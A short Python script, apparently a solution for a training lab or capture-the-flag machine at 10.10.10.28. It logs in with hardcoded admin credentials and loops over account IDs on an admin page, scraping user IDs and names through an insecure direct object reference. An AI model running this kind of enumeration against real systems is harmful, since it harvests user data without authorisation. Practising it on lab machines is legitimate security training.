import json

import lxml.html
import requests


base_url = "http://10.10.10.28/cdn-cgi/login"
params = {
    "content": "accounts",
    "id": 1
}

login_body = {
    "username": "admin",
    "password": "MEGACORP_4dm1n!!"
}

session = requests.Session()

# Start by logging in
r = session.post(f"{base_url}/index.php",
                 data=login_body)

# Loop integers to guess user IDs
for i in range(1, 100):
    params["id"] = i
    r = session.get(f"{base_url}/admin.php",
                    params=params)

    doc = lxml.html.fromstring(r.text)
    try:
        user_id = doc.xpath('//tr/td//text()')[0]
        user_name = doc.xpath('//tr/td//text()')[1]
        print(f"{i}:{user_id}:{user_name}")
    except IndexError:
        print(f"{i}:none:none")
